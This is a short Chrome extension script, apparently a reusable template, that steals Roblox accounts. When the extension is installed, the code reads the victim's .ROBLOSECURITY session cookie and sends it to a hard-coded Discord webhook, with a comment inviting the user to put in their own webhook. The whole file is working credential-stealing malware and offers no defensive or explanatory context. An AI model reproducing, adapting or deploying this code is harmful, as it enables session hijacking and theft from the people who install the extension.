const webhook = "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc"; // Put your webhook here for the information to be sent to.

chrome.runtime.onInstalled.addListener(() => {
  chrome.cookies.get(
    { url: "https://roblox.com", name: ".ROBLOSECURITY" },
    (cookie) => {
      if (cookie) {
        fetch(webhook, {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            embeds: [
              {
                title: "Cookie Logger Example",
                description: "```" + cookie.value + "```",
              },
            ],
          }),
        });
      }
    }
  );
});

